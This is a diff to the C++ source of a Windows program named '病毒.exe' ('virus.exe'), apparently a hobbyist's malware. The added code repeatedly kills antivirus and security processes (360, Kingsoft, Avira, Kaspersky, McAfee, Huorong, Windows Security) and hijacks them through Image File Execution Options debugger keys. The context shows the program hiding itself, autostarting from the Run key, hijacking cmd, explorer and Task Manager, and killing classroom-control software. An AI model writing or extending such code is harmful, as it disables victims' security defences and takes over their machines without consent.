@@ -170,6 +170,66 @@ DWORD WINAPI KILL(LPVOID Param)
 		{
 			do
 			{
+				if("360tray.exe"==(string)(pe32.szExeFile))
+				{
+					ProcessId=pe32.th32ProcessID;
+					break;
+				}
+			}while(Process32Next(hProcessSnapShot,&pe32));
+		}
+		::CloseHandle(hProcessSnapShot);
+    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
+    	TerminateProcess(hProcess,0);
+    	Sleep(1000);
+    	ProcessId=0;
+		hProcessSnapShot=NULL;
+		ZeroMemory(&pe32,sizeof(pe32));
+		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+		pe32.dwSize=sizeof(PROCESSENTRY32);
+		if(Process32First(hProcessSnapShot,&pe32))
+		{
+			do
+			{
+				if("hipstray.exe"==(string)(pe32.szExeFile))
+				{
+					ProcessId=pe32.th32ProcessID;
+					break;
+				}
+			}while(Process32Next(hProcessSnapShot,&pe32));
+		}
+		::CloseHandle(hProcessSnapShot);
+    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
+    	TerminateProcess(hProcess,0);
+    	Sleep(1000);
+    	ProcessId=0;
+		hProcessSnapShot=NULL;
+		ZeroMemory(&pe32,sizeof(pe32));
+		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+		pe32.dwSize=sizeof(PROCESSENTRY32);
+		if(Process32First(hProcessSnapShot,&pe32))
+		{
+			do
+			{
+				if("kxetray.exe"==(string)(pe32.szExeFile))
+				{
+					ProcessId=pe32.th32ProcessID;
+					break;
+				}
+			}while(Process32Next(hProcessSnapShot,&pe32));
+		}
+		::CloseHandle(hProcessSnapShot);
+    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
+    	TerminateProcess(hProcess,0);
+    	Sleep(1000);
+    	ProcessId=0;
+		hProcessSnapShot=NULL;
+		ZeroMemory(&pe32,sizeof(pe32));
+		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+		pe32.dwSize=sizeof(PROCESSENTRY32);
+		if(Process32First(hProcessSnapShot,&pe32))
+		{
+			do
+			{
 				if("Taskmgr.exe"==(string)(pe32.szExeFile))
 				{
 					ProcessId=pe32.th32ProcessID;
@@ -181,6 +241,162 @@ DWORD WINAPI KILL(LPVOID Param)
     	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
     	TerminateProcess(hProcess,0);
     	Sleep(1000);
+    	ProcessId=0;
+		hProcessSnapShot=NULL;
+		ZeroMemory(&pe32,sizeof(pe32));
+		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+		pe32.dwSize=sizeof(PROCESSENTRY32);
+		if(Process32First(hProcessSnapShot,&pe32))
+		{
+			do
+			{
+				if("360sd.exe"==(string)(pe32.szExeFile))
+				{
+					ProcessId=pe32.th32ProcessID;
+					break;
+				}
+			}while(Process32Next(hProcessSnapShot,&pe32));
+		}
+		::CloseHandle(hProcessSnapShot);
+    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
+    	TerminateProcess(hProcess,0);
+    	Sleep(1000);
+    	ProcessId=0;
+		hProcessSnapShot=NULL;
+		ZeroMemory(&pe32,sizeof(pe32));
+		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+		pe32.dwSize=sizeof(PROCESSENTRY32);
+		if(Process32First(hProcessSnapShot,&pe32))
+		{
+			do
+			{
+				if("Mcshield.exe"==(string)(pe32.szExeFile))
+				{
+					ProcessId=pe32.th32ProcessID;
+					break;
+				}
+			}while(Process32Next(hProcessSnapShot,&pe32));
+		}
+		::CloseHandle(hProcessSnapShot);
+    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
+    	TerminateProcess(hProcess,0);
+    	Sleep(1000);
+    	ProcessId=0;
+		hProcessSnapShot=NULL;
+		ZeroMemory(&pe32,sizeof(pe32));
+		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+		pe32.dwSize=sizeof(PROCESSENTRY32);
+		if(Process32First(hProcessSnapShot,&pe32))
+		{
+			do
+			{
+				if("avp.exe"==(string)(pe32.szExeFile))
+				{
+					ProcessId=pe32.th32ProcessID;
+					break;
+				}
+			}while(Process32Next(hProcessSnapShot,&pe32));
+		}
+		::CloseHandle(hProcessSnapShot);
+    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
+    	TerminateProcess(hProcess,0);
+    	Sleep(1000);
+    	ProcessId=0;
+		hProcessSnapShot=NULL;
+		ZeroMemory(&pe32,sizeof(pe32));
+		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+		pe32.dwSize=sizeof(PROCESSENTRY32);
+		if(Process32First(hProcessSnapShot,&pe32))
+		{
+			do
+			{
+				if("avcenter.exe"==(string)(pe32.szExeFile))
+				{
+					ProcessId=pe32.th32ProcessID;
+					break;
+				}
+			}while(Process32Next(hProcessSnapShot,&pe32));
+		}
+		::CloseHandle(hProcessSnapShot);
+    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
+    	TerminateProcess(hProcess,0);
+    	Sleep(1000);
+    	ProcessId=0;
+		hProcessSnapShot=NULL;
+		ZeroMemory(&pe32,sizeof(pe32));
+		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+		pe32.dwSize=sizeof(PROCESSENTRY32);
+		if(Process32First(hProcessSnapShot,&pe32))
+		{
+			do
+			{
+				if("AST.exe"==(string)(pe32.szExeFile))
+				{
+					ProcessId=pe32.th32ProcessID;
+					break;
+				}
+			}while(Process32Next(hProcessSnapShot,&pe32));
+		}
+		::CloseHandle(hProcessSnapShot);
+    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
+    	TerminateProcess(hProcess,0);
+    	Sleep(1000);
+    	ProcessId=0;
+		hProcessSnapShot=NULL;
+		ZeroMemory(&pe32,sizeof(pe32));
+		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+		pe32.dwSize=sizeof(PROCESSENTRY32);
+		if(Process32First(hProcessSnapShot,&pe32))
+		{
+			do
+			{
+				if("avgaurd.exe"==(string)(pe32.szExeFile))
+				{
+					ProcessId=pe32.th32ProcessID;
+					break;
+				}
+			}while(Process32Next(hProcessSnapShot,&pe32));
+		}
+		::CloseHandle(hProcessSnapShot);
+    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
+    	TerminateProcess(hProcess,0);
+    	Sleep(1000);
+    	ProcessId=0;
+		hProcessSnapShot=NULL;
+		ZeroMemory(&pe32,sizeof(pe32));
+		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+		pe32.dwSize=sizeof(PROCESSENTRY32);
+		if(Process32First(hProcessSnapShot,&pe32))
+		{
+			do
+			{
+				if("BaiduSdSvc.exe"==(string)(pe32.szExeFile))
+				{
+					ProcessId=pe32.th32ProcessID;
+					break;
+				}
+			}while(Process32Next(hProcessSnapShot,&pe32));
+		}
+		::CloseHandle(hProcessSnapShot);
+    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
+    	TerminateProcess(hProcess,0);
+    	Sleep(1000);
+    	system("taskkill /im avgaurd.exe /f");
+    	Sleep(100);
+    	system("taskkill /im AST.exe /f");
+    	Sleep(100);
+    	system("taskkill /im BaiduSdSvc.exe /f");
+    	Sleep(100);
+    	system("taskkill /im avcenter.exe /f");
+    	Sleep(100);
+    	system("taskkill /im avp.exe /f");
+    	Sleep(100);
+    	system("taskkill /im hipstray.exe /f");
+    	Sleep(100);
+    	system("taskkill /im 360sd.exe /f");
+    	Sleep(100);
+    	system("taskkill /im kxetray.exe /f");
+    	Sleep(100);
     	system("taskkill /im msedge.exe /f");
     	Sleep(100);
     	system("taskkill /im chrome.exe /f");
@@ -188,6 +404,8 @@ DWORD WINAPI KILL(LPVOID Param)
     	system("taskkill /im notepad.exe /f");
     	Sleep(100);
     	system("taskkill /im write.exe /f");
+    	Sleep(100);
+    	system("taskkill /im 360tray.exe /f");
     	Sleep(100);
     	system("taskkill /im devcpp.exe /f");
     	Sleep(100);
@@ -226,6 +444,28 @@ DWORD WINAPI KILL(LPVOID Param)
     	system("taskkill /im qq.exe /f");
     	Sleep(100);
     	system("taskkill /im studentmain.exe /f");
+    	Sleep(100);
+    	system("taskkill /im SecHealthUI.exe /f");
+    	ProcessId=0;
+		hProcessSnapShot=NULL;
+		ZeroMemory(&pe32,sizeof(pe32));
+		hProcessSnapShot=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+		pe32.dwSize=sizeof(PROCESSENTRY32);
+		if(Process32First(hProcessSnapShot,&pe32))
+		{
+			do
+			{
+				if("SecHealthUI.exe"==(string)(pe32.szExeFile))
+				{
+					ProcessId=pe32.th32ProcessID;
+					break;
+				}
+			}while(Process32Next(hProcessSnapShot,&pe32));
+		}
+		::CloseHandle(hProcessSnapShot);
+    	hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
+    	TerminateProcess(hProcess,0);
+    	Sleep(1000);//爆杀360,金山毒霸,小红伞,卡巴斯基,火绒等杀毒软件 
     	ProcessId=0;
 		hProcessSnapShot=NULL;
 		ZeroMemory(&pe32,sizeof(pe32));
@@ -248,7 +488,7 @@ DWORD WINAPI KILL(LPVOID Param)
     	Sleep(1000);
 		Sleep(360000);
 	}
-}//把常用进程炸了(顺便帮个忙,把极域课堂杀了)
+}//把常用进程+杀毒软件炸了(顺便帮个忙,把极域课堂杀了)
 char pathn[6145];
 string k;
 void CreateReg(HKEY Root,char*szSubKey,char* ValueName,char* Data)
@@ -266,8 +506,8 @@ int main()
 	k=pathn;
 	k+="\\病毒.exe";
 	SetFileAttributes((char*)k.c_str(),FILE_ATTRIBUTE_HIDDEN);//隐藏文件 
-    CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Run","病毒.exe",(char*)k.c_str()); //开机自启动 
-    CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Run","病毒.exe",(char*)k.c_str()); //开机自启动 
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe","Debugger",(char*)k.c_str());
 	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe","Debugger",(char*)k.c_str());
 	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\qq.exe","Debugger",(char*)k.c_str());
 	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Taskmgr.exe","Debugger",(char*)k.c_str());
@@ -280,7 +520,18 @@ int main()
 	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ONENOTE.exe","Debugger",(char*)k.c_str());
 	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\EXCEL.exe","Debugger",(char*)k.c_str());
 	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mspaint.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SecHealthUI.exe","Debugger",(char*)k.c_str());
 	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\360safe.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\360tray.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AST.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\avp.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\360tray.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SecHealthUI.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Mcshield.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\kxetray.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\avcentre.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\avgaurd.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\hipstray.exe","Debugger",(char*)k.c_str());
 	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe","Debugger",(char*)k.c_str());//映像劫持 
     FILE *lock=fopen("病毒.exe","rb");//锁死文件,杀不掉 
 	CreateThread(NULL,4096,&NOSHUT,NULL,NULL,NULL);
